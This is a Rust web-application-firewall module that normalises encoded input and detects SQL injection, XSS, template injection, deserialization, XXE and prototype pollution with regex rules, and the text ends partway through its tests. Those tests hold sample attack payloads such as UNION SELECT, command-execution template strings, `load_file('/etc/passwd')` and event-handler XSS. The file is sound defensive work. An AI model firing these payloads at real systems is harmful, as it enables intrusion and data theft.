//! WAF_DETECT_V2：SQL 注入與 XSS 的結構化偵測。
//!
//! 取代「只看單一子字串」的部分規則。設計重點：
//! - 先正規化再比對：多層 URL 解碼（`+` 視為空白）、HTML 實體、`\uXXXX`／`\xHH`、
//!   全形 ASCII、移除 `/* */` 註解、轉小寫。攻擊者常用的繞過手法都在這一層還原。
//! - 規則要求「結構」而不是單一關鍵字：例如 `union select`、`' or 1=1`、`admin'--`、
//!   寫在標籤屬性內的事件處理器。文章裡單獨出現的 "select"、"sleep" 不會命中。
//! - 本體（body）只做分段掃描：超過 4 MiB 時只掃前後各 2 MiB，避免攻擊者靠填充
//!   讓正規表達式耗盡 CPU。完整本體仍由 `WAF_BODY_PATTERNS` 的子字串規則掃描。
//! - 範圍（`Scope`）：URL／標頭 與 本體 使用的規則不同。本體排除 DOM 相關規則
//!   （`document.cookie` 等），因為教材與程式碼常包含這些字串。

use once_cell::sync::Lazy;
use regex::Regex;

/// 本體結構化掃描的單段上限（前段與後段各取這麼多）。
pub const BODY_SCAN_WINDOW_BYTES: usize = 2 * 1024 * 1024;

/// 偵測範圍。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    /// URL、路徑與標頭（Referer、Cookie）。
    Url,
    /// 請求本體（POST／PUT／PATCH 的文字內容）。
    Body,
}

/// 正規化：反覆解碼直到穩定（最多 3 輪，防止多層編碼）。
pub fn normalize(input: &str) -> String {
    let mut current = input.to_string();
    for _ in 0..3 {
        let next = normalize_once(&current);
        if next == current {
            break;
        }
        current = next;
    }
    current
}

fn normalize_once(input: &str) -> String {
    strip_block_comments(&decode_once(input))
}

/// 只解碼、不移除註解（供 token 層使用：版本註解 `/*!…*/` 內容是要執行的）。
fn decode_once(input: &str) -> String {
    let decoded = percent_decode_lossy(input);
    let decoded = decode_html_entities(&decoded);
    let decoded = decode_escapes(&decoded);
    let folded: String = decoded.chars().map(fold_fullwidth).collect();
    folded.to_lowercase()
}

/// 反覆解碼直到穩定（同 normalize，但保留註解）。
fn decode_only(input: &str) -> String {
    let mut current = input.to_string();
    for _ in 0..3 {
        let next = decode_once(&current);
        if next == current {
            break;
        }
        current = next;
    }
    current
}

/// 移除 `#` 到行尾的註解（只用於第二輪掃描；原文仍會被掃描，所以不會減少攔截）。
fn strip_hash_comments(s: &str) -> String {
    s.lines()
        .map(|line| line.find('#').map_or(line, |i| &line[..i]))
        .collect::<Vec<_>>()
        .join("\n")
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// URL 解碼；`+` 視為空白（表單與查詢字串的慣例）。無效的 `%` 序列原樣保留。
fn percent_decode_lossy(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 5 < bytes.len() && bytes[i + 1] == b'u' => {
                // C2：IIS 風格 %uXXXX（僅在 4 位十六進位完整時解碼，否則原樣保留）。
                let digits = [bytes[i + 2], bytes[i + 3], bytes[i + 4], bytes[i + 5]];
                let decoded = digits
                    .iter()
                    .try_fold(0u32, |acc, &d| hex_val(d).map(|v| acc * 16 + u32::from(v)))
                    .and_then(char::from_u32);
                if let Some(c) = decoded {
                    let mut buf = [0u8; 4];
                    out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
                    i += 6;
                } else {
                    out.push(b'%');
                    i += 1;
                }
            }
            b'%' if i + 2 < bytes.len() => {
                if let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                    out.push(h * 16 + l);
                    i += 3;
                    continue;
                }
                out.push(b'%');
                i += 1;
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// 解析一個以 `&` 開頭的 HTML 實體，回傳 (字元, 消耗的位元組數)。
fn decode_one_entity(s: &str) -> Option<(char, usize)> {
    let limit = s.len().min(12);
    let semi = s.as_bytes()[..limit].iter().position(|&b| b == b';')?;
    let name = &s[1..semi];
    let c = match name {
        "lt" => '<',
        "gt" => '>',
        "quot" => '"',
        "apos" => '\'',
        "amp" => '&',
        "sol" => '/',
        "colon" => ':',
        "lpar" => '(',
        "rpar" => ')',
        "equals" => '=',
        "num" => '#',
        "nbsp" => ' ',
        "Tab" => '\t',
        "NewLine" => '\n',
        _ => {
            if let Some(hex) = name.strip_prefix("#x").or_else(|| name.strip_prefix("#X")) {
                u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)?
            } else if let Some(dec) = name.strip_prefix('#') {
                dec.parse::<u32>().ok().and_then(char::from_u32)?
            } else {
                return None;
            }
        }
    };
    Some((c, semi + 1))
}

fn decode_html_entities(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(pos) = rest.find('&') {
        out.push_str(&rest[..pos]);
        let after = &rest[pos..];
        match decode_one_entity(after) {
            Some((c, consumed)) => {
                out.push(c);
                rest = &after[consumed..];
            }
            None => {
                out.push('&');
                rest = &after[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// 還原 `\uXXXX` 與 `\xHH`（JSON 與 JavaScript 字串中常見的混淆手法）。
fn decode_escapes(s: &str) -> String {
    if !s.contains('\\') {
        return s.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() {
            // C2：JSON／JS 的跳脫引號與斜線（解析後的 href=\"jav… 會還原成 href="jav…）。
            if matches!(chars[i + 1], '"' | '\'' | '/') {
                out.push(chars[i + 1]);
                i += 2;
                continue;
            }
            if chars[i + 1] == 'u' && i + 6 <= chars.len() {
                let hex: String = chars[i + 2..i + 6].iter().collect();
                if let Some(c) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                    out.push(c);
                    i += 6;
                    continue;
                }
            }
            if chars[i + 1] == 'x' && i + 4 <= chars.len() {
                let hex: String = chars[i + 2..i + 4].iter().collect();
                if let Some(c) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                    out.push(c);
                    i += 4;
                    continue;
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// 全形 ASCII（U+FF01–U+FF5E）與全形空白轉為半形。
fn fold_fullwidth(c: char) -> char {
    match c as u32 {
        0xFF01..=0xFF5E => char::from_u32(c as u32 - 0xFEE0).unwrap_or(c),
        0x3000 => ' ',
        _ => c,
    }
}

/// 把 `/* ... */` 換成單一空白（`union/**/select` → `union select`）。
/// 未閉合的 `/*` 保留原文，避免用它來隱藏後面的內容。
fn strip_block_comments(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(start) = rest.find("/*") {
        out.push_str(&rest[..start]);
        match rest[start + 2..].find("*/") {
            Some(end) => {
                out.push(' ');
                rest = &rest[start + 2 + end + 2..];
            }
            None => {
                out.push_str(&rest[start..]);
                return out;
            }
        }
    }
    out.push_str(rest);
    out
}

fn re(pattern: &str) -> Regex {
    // 所有 pattern 都是編譯期固定的字串，測試會驗證它們都能編譯。
    Regex::new(pattern).expect("WAF_DETECT_V2 pattern must compile")
}

/// 布林式恆真條件：`or 1=1`、`' or '1'='1`、`' or ''='`。
/// 兩側的值相同（去掉引號後比較）才算命中，所以 `or 1=2` 不會命中。
static SQLI_TAUTOLOGY: Lazy<Regex> = Lazy::new(|| {
    // C1：補上 xor 與 || 運算子（MySQL 的 || 即 OR）。群組順序不變：2 = 左側、3 = 右側。
    re(r#"(?:\b(or|and|xor)\s+|\|\|\s*)(\d+|'[^']*'?|"[^"]*"?)\s*=\s*(\d+|'[^']*'?|"[^"]*"?)"#)
});

/// (規則, 名稱, 是否僅限 URL 範圍)。本體範圍會略過僅限 URL 的規則：
/// 時間延遲規則會誤判程式碼與文章中的 `sleep(`（原本的子字串規則也因此排除 `sleep(`）。
static SQLI_RULES: Lazy<Vec<(Regex, &'static str, bool)>> = Lazy::new(|| {
    vec![
        (
            re(r"\bunion\s+(all\s+|distinct\s+)?select\b"),
            "UNION SELECT 注入",
            false,
        ),
        (
            // 堆疊查詢必須接上 SQL 結構，避免誤判「; update the docs」之類的英文句子。
            re(r";\s*(drop\s+(table|database|schema)|insert\s+into|delete\s+from|update\s+[\w.`\[\]]+\s+set|select\s+(\*|[\w.]+(\s*,\s*[\w.]+)*)\s+from\s+[\w.`]+(\s+(where|limit|order|group)\b|\s*($|;|--|#))|exec(ute)?\s+\w|shutdown\b|truncate\s+table|alter\s+table|create\s+(table|user|database))"),
            "堆疊查詢",
            false,
        ),
        (
            re(r"'\s*(--(\s|$)|#(\s|$))"),
            "引號後接註解截斷",
            false,
        ),
        (
            re(r"\b(sleep|pg_sleep|benchmark)\s*\(|\bwaitfor\s+delay\b"),
            "時間延遲注入",
            true,
        ),
        (
            re(r"\binformation_schema\b|\bsys\.(databases|tables|objects)\b|\bmysql\.user\b|@@version"),
            "資訊架構探測",
            false,
        ),
        (
            re(r"\bload_file\s*\(|\binto\s+(outfile|dumpfile)\b"),
            "檔案讀寫",
            false,
        ),
        (
            re(r"\b(extractvalue|updatexml)\s*\("),
            "XPath 錯誤注入",
            false,
        ),
        (re(r"\bxp_cmdshell\b"), "xp_cmdshell 命令執行", false),
        (
            // C1：子查詢注入。只在 URL 範圍套用（本體中的程式碼與文章可能含有 (select ...)）。
            // 只匹配具有 SQL 結構的形式：(select * / count( / @@ / 函式( / 欄位 from 表名。
            re(r"\(\s*select\s+(?:\*|\d+\s*\)|count\s*\(|@@|\w+\s*\(|[\w.`\[\]]+\s*(?:,\s*[\w.`\[\]]+\s*)*from\s+[\w.`\[\]]+)"),
            "子查詢注入（URL 範圍）",
            true,
        ),
    ]
});

/// SQL 注入偵測。命中時回傳規則名稱。
pub fn detect_sqli(raw: &str, scope: Scope) -> Option<&'static str> {
    let text = normalize(raw);
    for caps in SQLI_TAUTOLOGY.captures_iter(&text) {
        let strip = |m: &str| m.trim_matches(|c: char| c == '\'' || c == '"').to_string();
        if strip(&caps[2]) == strip(&caps[3]) {
            return Some("恆真條件（OR/AND 兩側相同）");
        }
    }
    // 第二輪：移除 # 註解後再掃描（原文已掃過，故只會增加攔截）。
    let no_hash = strip_hash_comments(&text);
    for candidate in [text.as_str(), no_hash.as_str()] {
        for (regex, label, url_only) in SQLI_RULES.iter() {
            if *url_only && scope == Scope::Body {
                continue;
            }
            if regex.is_match(candidate) {
                return Some(label);
            }
        }
    }
    // C9／E1：token 層作為最後的補充（只增加攔截，既有規則的標籤保持不變）。
    crate::adapters::admin_web::waf_sql_lex::token_sqli_label(&decode_only(raw))
}

static XSS_RULES_COMMON: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (re(r"<\s*/?\s*script\b"), "script 標籤"),
        (
            re(r"<\s*/?\s*(iframe|frame|frameset|object|embed|applet|base)\b"),
            "危險嵌入標籤",
        ),
        (
            re(r#"<\s*meta\b[^>]*http-equiv\s*=\s*['"]?refresh"#),
            "meta refresh 跳轉",
        ),
        (
            // 只在標籤內才算事件處理器（`<svg/onload=`、`<img src=x onerror=`）。
            // C2：不再依賴固定事件清單，任何 on…= 屬性都算（涵蓋 onauxclick、onfocusin、onstart 等）。
            // R-13（2026-11-04 決定 a）：只比對已知事件名稱（與屬性跳出規則同一組），
            // 避免 `<span title="online=yes">` 這類文字誤判。白名單外的事件名稱不再攔截。
            // 本規則對 URL 與本體都適用；URL 範圍另有通用 on…= 規則（見 XSS_RULES_URL_ONLY），因此 URL 覆蓋不縮小。
            // 事件清單須與 XSS_RULES_URL_ONLY「屬性跳出」規則保持同步。
            re(r##"<\s*[a-z][^>]*[\s/'"]on(?:focus(?:in|out)?|blur|load|error|mouse(?:over|out|enter|leave|down|up|move)|click|dblclick|auxclick|contextmenu|input|beforeinput|change|submit|reset|toggle|select|scroll|wheel|key(?:down|up|press)|animation(?:start|end|iteration)|transition(?:start|end)|pointer(?:over|enter|down|up|move)|drag(?:start|enter|over|end)?|copy|paste|cut|invalid|search|start|begin|end|play|pause|message|hashchange|pageshow|show|touch(?:start|move|end)|formdata)\s*="##),
            "事件處理器屬性",
        ),
        (
            re(&format!(
                r#"\b(href|src|action|formaction|xlink:href|data|srcdoc|poster|background|dynsrc|lowsrc|values|to|from)\s*=\s*['"`]?\s*(?:{}|{}|livescript)\s*:"#,
                tab_tolerant("javascript"),
                tab_tolerant("vbscript"),
            )),
            "危險協議 URL 屬性",
        ),
        (
            re(r"\bdata\s*:\s*(text/html|image/svg\+xml|application/xhtml)"),
            "data URI 可執行內容",
        ),
        (
            re(r#"style\s*=\s*['"][^'"]*(expression\s*\(|-moz-binding|behavior\s*:|url\(\s*['"]?\s*javascript)"#),
            "CSS 表達式／行為注入",
        ),
    ]
});

/// C2：協議字串允許字元之間夾 tab／換行／CR（瀏覽器會忽略這些字元，例如 `jav\tascript:`）。
fn tab_tolerant(word: &str) -> String {
    word.chars()
        .map(|c| c.to_string())
        .collect::<Vec<_>>()
        .join(r"[\t\n\r]*")
        + r"[\t\n\r]*"
}

/// 只用於 URL、標頭範圍的 DOM 規則。本體排除，因為教材與程式碼常包含這些字串。
static XSS_RULES_URL_ONLY: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (
            // R-13：URL 範圍維持通用 on…= 規則，不因事件白名單縮小 URL 的覆蓋。
            re(r#"<\s*[a-z][^>]*[\s/'"]on[a-z]+\s*="#),
            "事件處理器屬性（URL 範圍）",
        ),
        (
            re(r"document\.(cookie|write|domain)|\bwindow\.location\s*=|\bdocument\.location\b"),
            "DOM 外洩或跳轉",
        ),
        (
            // C2：解碼後執行的鏈（`eval(atob('…'))`）。本體不套用（程式碼範例會含有這些字串）。
            re(r"\b(eval|settimeout|setinterval|function)\s*\(\s*(atob|unescape|decodeuricomponent|string\.fromcharcode)\s*\("),
            "解碼後執行（URL 範圍）",
        ),
        (
            // C2 屬性跳出：引號閉合後接事件屬性（`" autofocus onfocus=…`），沒有 `<`，也不一定有 alert。
            // 只比對已知事件名稱：通用 `on[a-z]+` 會誤判 `online=`、`onboarding=` 之類的一般文字。
            // 不排除 `;`：`"; autofocus onfocus=…` 同樣是跳出，排除會留下繞過。
            // 本體不套用（HTML 片段與教材含有這些字串）。
            re(r##"["'`][^<>]{0,120}?[\s/]on(?:focus(?:in|out)?|blur|load|error|mouse(?:over|out|enter|leave|down|up|move)|click|dblclick|auxclick|contextmenu|input|beforeinput|change|submit|reset|toggle|select|scroll|wheel|key(?:down|up|press)|animation(?:start|end|iteration)|transition(?:start|end)|pointer(?:over|enter|down|up|move)|drag(?:start|enter|over|end)?|copy|paste|cut|invalid|search|start|begin|end|play|pause|message|hashchange|pageshow|show|touch(?:start|move|end)|formdata)\s*="##),
            "屬性跳出（URL 範圍）",
        ),
        (
            // C2：JS 執行函式（`'-alert(1)-'` 這類不需要標籤的注入）。本體不套用。
            re(r"\b(alert|prompt|confirm)\s*\("),
            "JS 執行函式（URL 範圍）",
        ),
    ]
});

/// XSS 偵測。命中時回傳規則名稱。
pub fn detect_xss(raw: &str, scope: Scope) -> Option<&'static str> {
    let text = normalize(raw);
    for (regex, label) in XSS_RULES_COMMON.iter() {
        if regex.is_match(&text) {
            return Some(label);
        }
    }
    if scope == Scope::Url {
        for (regex, label) in XSS_RULES_URL_ONLY.iter() {
            if regex.is_match(&text) {
                return Some(label);
            }
        }
    }
    None
}

fn floor_boundary(s: &str, mut i: usize) -> usize {
    while !s.is_char_boundary(i) {
        i -= 1;
    }
    i
}

fn ceil_boundary(s: &str, mut i: usize) -> usize {
    while !s.is_char_boundary(i) {
        i += 1;
    }
    i
}

/// 本體分段：不超過 2 段視窗時整個掃描；否則回傳前段與後段。
pub fn body_windows(body: &str) -> (&str, Option<&str>) {
    if body.len() <= BODY_SCAN_WINDOW_BYTES * 2 {
        return (body, None);
    }
    let head_end = floor_boundary(body, BODY_SCAN_WINDOW_BYTES);
    let tail_start = ceil_boundary(body, body.len() - BODY_SCAN_WINDOW_BYTES);
    (&body[..head_end], Some(&body[tail_start..]))
}

// ---- WAF_SSTI_PROTO_SCOPED_V1（C7 SSTI、C8 原型鏈污染，限縮範圍） ----
// 規則刻意只取「高信心」形式。URL 範圍可用較完整的 JS／Velocity API；
// 本體範圍只用 JSON 鍵值與範本引擎的危險物件存取，避免誤判教材與程式碼。

static SSTI_RULES_COMMON: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (
            re(r"\{\{[^}]{0,200}(__class__|__globals__|__builtins__|__subclasses__|__mro__|__import__|__init__)"),
            "Jinja2 Python 物件鏈存取",
        ),
        (
            re(r"\{\{[^}]{0,200}(request\.application|request\.environ|config\.items|lipsum\.__globals__)"),
            "Jinja2 request／config 存取",
        ),
        (
            re(r"\{\{[^}]{0,200}(_self\.env|registerundefinedfiltercallback|getfilter\s*\()"),
            "Twig 環境存取",
        ),
        (
            re(r"\{\{[^}]{0,200}\b(system|exec|passthru|shell_exec|popen|eval|assert)\s*\("),
            "範本內呼叫危險函式",
        ),
        (
            re(r"\$\{[^}]{0,200}(t\(java\.lang\.|freemarker\.template\.utility|new\s+java\.|\.getclass\(\)|getruntime\(\))"),
            "Java EL／FreeMarker 物件存取",
        ),
        (
            re(r"#\{[^}]{0,200}t\(java\.lang\."),
            "Spring EL 類別存取",
        ),
        (
            re(r"<#assign[^>]{0,200}(new\s*\(|execute|class)"),
            "FreeMarker assign 注入",
        ),
        (
            re(r"\{php\}|\{system\(|\{exec\(|\{passthru\(|self::getstreamvariable"),
            "Smarty 程式碼執行",
        ),
        (
            re(r"\$class\.inspect\(|\.getclass\(\)\.forname\(|\$ex\.getclass\("),
            "Velocity 反射存取",
        ),
        (
            re(r"<%=?\s*(system|exec|io\.popen|%x)\b"),
            "ERB 命令執行",
        ),
        (
            re(r"\{\{[^}]{0,200}\.constructor\s*\("),
            "JS constructor 呼叫（Handlebars／Nunjucks）",
        ),
        (
            re(r"\{\{[^}]{0,200}(process\.mainmodule|child_process|require\s*\()"),
            "範本內 Node 模組存取",
        ),
        (
            re(r"\{%[^%]{0,200}(__class__|__globals__|__builtins__|__subclasses__|__mro__|__import__|os\.popen|subprocess|config\.items)"),
            "Jinja／Twig 區塊語句注入",
        ),
        (
            re(r"<%[^%]{0,200}(__import__|import\s+os\b|os\.popen|subprocess|system\s*\()"),
            "Mako／ERB 區塊程式碼注入",
        ),
        (
            re(r"\{\{\s*7\s*\*\s*7\s*\}\}|\$\{\s*7\s*\*\s*7\s*\}|<%=\s*7\s*\*\s*7\s*%>|#\{\s*7\s*\*\s*7\s*\}"),
            "SSTI 數學運算探測",
        ),
    ]
});

/// 只用於 URL 範圍的 SSTI 規則（Velocity 指令；本體中可能出現在程式碼範例裡）。
static SSTI_RULES_URL_ONLY: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![(
        re(r"#(set|foreach|macro|parse|include)\s*\(\s*\$"),
        "Velocity 指令注入",
    )]
});

/// SSTI 偵測（C7，限縮範圍）。
pub fn detect_ssti(raw: &str, scope: Scope) -> Option<&'static str> {
    let text = normalize(raw);
    for (regex, label) in SSTI_RULES_COMMON.iter() {
        if regex.is_match(&text) {
            return Some(label);
        }
    }
    if scope == Scope::Url {
        for (regex, label) in SSTI_RULES_URL_ONLY.iter() {
            if regex.is_match(&text) {
                return Some(label);
            }
        }
    }
    None
}

// ---- WAF_DESER_V1（E6 反序列化）：統一小寫化後比對（normalize），魔數需要邊界以免誤判隨機 base64 ----
static DESER_RULES_COMMON: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (
            re(r"(^|[^a-z0-9+/])ro0ab[a-z0-9+/]{4,}"),
            "Java 序列化魔數（base64）",
        ),
        (
            re(r"(^|[^0-9a-f])aced0005[0-9a-f]{4}"),
            "Java 序列化魔數（hex）",
        ),
        (
            re(r"(^|[^a-z0-9+/])aaeaaad/////"),
            ".NET BinaryFormatter 魔數",
        ),
        (
            // XXE：DOCTYPE 內部子集，或 SYSTEM 指向外部 URL（外部 DTD 會在伺服器端抓取）。
            // 一般 HTML 的 <!DOCTYPE html>、XHTML 的 PUBLIC 形式不命中。
            re(r#"<!doctype[^>]{0,300}(\[|\bsystem\s*["'](https?|ftp|file|php|jar|netdoc|gopher|expect):)"#),
            "XXE：DOCTYPE 內部子集或外部 SYSTEM 位址",
        ),
        (
            re(r"invokertransformer|chainedtransformer|templatesimpl|convertedclosure|badattributevalueexpexception|objectdataprovider|typeconfusedelegate|jdbcrowsetimpl"),
            "已知反序列化 gadget 類別",
        ),
    ]
});

/// 只用於 URL 範圍：PHP 物件字串與 unserialize 呼叫（本體中可能出現在教材與程式碼範例）。
static DESER_RULES_URL_ONLY: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (
            re(r#"(^|[^a-z0-9_])o:\d{1,3}:"[a-z_\\]{1,64}":\d{1,3}:\{"#),
            "PHP 物件反序列化字串",
        ),
        (re(r"unserialize\s*\("), "PHP unserialize 呼叫"),
    ]
});

/// 反序列化特徵偵測（E6）。body 範圍只用 COMMON 規則。
pub fn detect_deserialization(raw: &str, scope: Scope) -> Option<&'static str> {
    let text = normalize(raw);
    for (regex, label) in DESER_RULES_COMMON.iter() {
        if regex.is_match(&text) {
            return Some(label);
        }
    }
    if scope == Scope::Url {
        for (regex, label) in DESER_RULES_URL_ONLY.iter() {
            if regex.is_match(&text) {
                return Some(label);
            }
        }
    }
    None
}

static PROTO_RULES_COMMON: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (
            re(r#"["']__proto__["']\s*:"#),
            "JSON __proto__ 鍵注入",
        ),
        (
            re(r#"["']constructor["']\s*:\s*\{\s*["']prototype["']"#),
            "JSON constructor.prototype 巢狀注入",
        ),
        (
            re(r#"["'](__proto__|constructor\.prototype)[.\[]"#),
            "JSON 字串值的原型路徑（路徑式 set 注入）",
        ),
        (
            re(r"constructor\.prototype\.(isadmin|role|admin|polluted|permission)"),
            "constructor.prototype 屬性寫入",
        ),
    ]
});

/// 只用於 URL 範圍的原型鏈規則（JS API 與括號路徑；本體中常見於程式碼範例）。
static PROTO_RULES_URL_ONLY: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| {
    vec![
        (re(r"__proto__\s*[=.\[]"), "URL __proto__ 參數注入"),
        (re(r#"\[\s*["']?__proto__"#), "括號路徑 __proto__ 注入"),
        (re(r#"constructor\s*\[\s*["']?prototype"#), "括號形式 constructor[prototype]"),
        (
            re(r"(object|reflect)\s*\.\s*(setprototypeof|defineproperty|defineproperties)\s*\("),
            "JS 原型 API 注入",
        ),
        (re(r"__(define|lookup)(getter|setter)__\s*\("), "__defineGetter__／__lookupGetter__ 等"),
    ]
});

/// 原型鏈污染偵測（C8，限縮範圍）。
pub fn detect_proto_pollution(raw: &str, scope: Scope) -> Option<&'static str> {
    let text = normalize(raw);
    for (regex, label) in PROTO_RULES_COMMON.iter() {
        if regex.is_match(&text) {
            return Some(label);
        }
    }
    if scope == Scope::Url {
        for (regex, label) in PROTO_RULES_URL_ONLY.iter() {
            if regex.is_match(&text) {
                return Some(label);
            }
        }
    }
    None
}

#[cfg(test)]
mod ssti_proto_tests {
    use super::*;

    // ---- SSTI：應命中 ----
    #[test]
    fn ssti_python_and_java_payloads_are_detected() {
        assert!(detect_ssti("{{''.__class__.__mro__[1].__subclasses__()}}", Scope::Body).is_some());
        assert!(detect_ssti("%7B%7B%20config.items()%20%7D%7D", Scope::Url).is_some());
        assert!(detect_ssti("${T(java.lang.Runtime).getRuntime().exec('id')}", Scope::Body).is_some());
        assert!(detect_ssti("#{T(java.lang.ProcessBuilder)}", Scope::Body).is_some());
        assert!(detect_ssti("<#assign ex=\"freemarker.template.utility.Execute\"?new()>", Scope::Body).is_some());
        assert!(detect_ssti("{php}system('id');{/php}", Scope::Body).is_some());
        assert!(detect_ssti("<%= system('id') %>", Scope::Body).is_some());
    }

    #[test]
    fn ssti_math_probe_is_detected() {
        assert!(detect_ssti("{{7*7}}", Scope::Body).is_some());
        assert!(detect_ssti("${ 7 * 7 }", Scope::Url).is_some());
    }

    #[test]
    fn ssti_velocity_directive_is_url_only() {
        assert!(detect_ssti("#set($x = 1)", Scope::Url).is_some());
        assert!(detect_ssti("#set($x = 1)", Scope::Body).is_none());
    }

    // ---- SSTI：不應命中（教材與一般模板語法） ----
    #[test]
    fn ssti_benign_template_text_is_not_flagged() {
        assert!(detect_ssti("請把 {{name}} 換成學生姓名", Scope::Body).is_none());
        assert!(detect_ssti("{{ user.name }} 會顯示使用者名稱", Scope::Body).is_none());
        assert!(detect_ssti("價格是 ${price} 元", Scope::Body).is_none());
        assert!(detect_ssti("公式 \\{x \\in A\\}", Scope::Body).is_none());
        assert!(detect_ssti("print(eval) 是什麼意思", Scope::Body).is_none());
        assert!(detect_ssti("<p>第三週作業</p>", Scope::Body).is_none());
    }

    // ---- 原型鏈污染：應命中 ----
    #[test]
    fn proto_json_keys_are_detected_in_body() {
        assert!(detect_proto_pollution(r#"{"__proto__": {"isAdmin": true}}"#, Scope::Body).is_some());
        assert!(detect_proto_pollution(r#"{"constructor": {"prototype": {"role": "admin"}}}"#, Scope::Body).is_some());
        assert!(detect_proto_pollution("constructor.prototype.isAdmin=1", Scope::Body).is_some());
    }

    #[test]
    fn proto_url_forms_are_detected() {
        assert!(detect_proto_pollution("?__proto__[isAdmin]=1", Scope::Url).is_some());
        assert!(detect_proto_pollution("?constructor[prototype][role]=admin", Scope::Url).is_some());
        assert!(detect_proto_pollution("?x=Object.setPrototypeOf(a,b)", Scope::Url).is_some());
        assert!(detect_proto_pollution("?x=Reflect.defineProperty(a,b,c)", Scope::Url).is_some());
        assert!(detect_proto_pollution("?x=__defineGetter__(a)", Scope::Url).is_some());
    }

    // ---- 原型鏈污染：不應命中（JS 教材與程式碼） ----
    #[test]
    fn proto_js_teaching_code_in_body_is_not_flagged() {
        assert!(detect_proto_pollution("Object.setPrototypeOf(Child.prototype, Parent.prototype);", Scope::Body).is_none());
        assert!(detect_proto_pollution("const d = Reflect.defineProperty(obj, 'x', {});", Scope::Body).is_none());
        assert!(detect_proto_pollution("obj.__proto__ === Foo.prototype", Scope::Body).is_none());
        assert!(detect_proto_pollution("說明 constructor 與 prototype 的差別", Scope::Body).is_none());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- SQL 注入：應命中 ----
    #[test]
    fn sqli_union_select_variants() {
        assert!(detect_sqli("1 union select password from users", Scope::Url).is_some());
        assert!(detect_sqli("1%20UNION%20ALL%20SELECT%201", Scope::Url).is_some());
        assert!(detect_sqli("1+union+select+1", Scope::Url).is_some());
        assert!(detect_sqli("1/**/union/**/select/**/1", Scope::Url).is_some());
        assert!(detect_sqli("1%2f%2a%2a%2funion%2f%2a%2a%2fselect", Scope::Url).is_some());
    }

    #[test]
    fn sqli_tautology_and_quote_bypass() {
        assert!(detect_sqli("id=1' or '1'='1", Scope::Url).is_some());
        assert!(detect_sqli("id=1%27%20or%20%271%27%3D%271", Scope::Url).is_some());
        assert!(detect_sqli("user=admin' or 1=1", Scope::Url).is_some());
        assert!(detect_sqli("x=' or ''='", Scope::Url).is_some());
        assert!(detect_sqli("user=admin'--", Scope::Url).is_some());
        assert!(detect_sqli("user=admin'#", Scope::Url).is_some());
    }

    #[test]
    fn sqli_stacked_time_schema_file_xpath() {
        assert!(detect_sqli("id=1;drop table users", Scope::Url).is_some());
        assert!(detect_sqli("id=1 and sleep(5)", Scope::Url).is_some());
        assert!(detect_sqli("id=1 and pg_sleep(5)", Scope::Url).is_some());
        assert!(detect_sqli("id=1 waitfor delay '0:0:5'", Scope::Url).is_some());
        assert!(detect_sqli("select table_name from information_schema.tables", Scope::Url).is_some());
        assert!(detect_sqli("1 and 1 in (select 1)", Scope::Url).is_some());
        assert!(detect_sqli("1 and 1 in (select the correct answer)", Scope::Url).is_none());
        assert!(detect_sqli("select @@version", Scope::Url).is_some());
        assert!(detect_sqli("id=1 into outfile '/tmp/x'", Scope::Url).is_some());
        assert!(detect_sqli("load_file('/etc/passwd')", Scope::Url).is_some());
        assert!(detect_sqli("and extractvalue(1,concat(0x7e,version()))", Scope::Url).is_some());
        assert!(detect_sqli("exec xp_cmdshell 'dir'", Scope::Url).is_some());
    }

    #[test]
    fn sqli_double_encoded_payload_is_normalized() {
        assert!(detect_sqli("q=%2527%2520or%2520%25271%2527%253D%25271", Scope::Url).is_some());
    }

    // ---- SQL 注入：不應命中（一般文字） ----
    #[test]
    fn sqli_plain_text_is_not_flagged() {
        assert!(detect_sqli("請幫我選課 select 課程", Scope::Url).is_none());
        assert!(detect_sqli("今天天氣很好, or 不是?", Scope::Url).is_none());
        assert!(detect_sqli("我們晚上 sleep 八小時", Scope::Url).is_none());
        assert!(detect_sqli("C++ --help 參數說明", Scope::Url).is_none());
        assert!(detect_sqli("color: '#fff' and 'red'", Scope::Url).is_none());
        assert!(detect_sqli("order by id desc limit 10", Scope::Url).is_none());
        assert!(detect_sqli("or 1=2 不成立", Scope::Url).is_none());
    }

    // ---- XSS：應命中 ----
    #[test]
    fn xss_script_and_event_handlers() {
        assert!(detect_xss("<script>alert(1)</script>", Scope::Url).is_some());
        assert!(detect_xss("<img src=x onerror=alert(1)>", Scope::Url).is_some());
        assert!(detect_xss("<svg/onload=alert(1)>", Scope::Url).is_some());
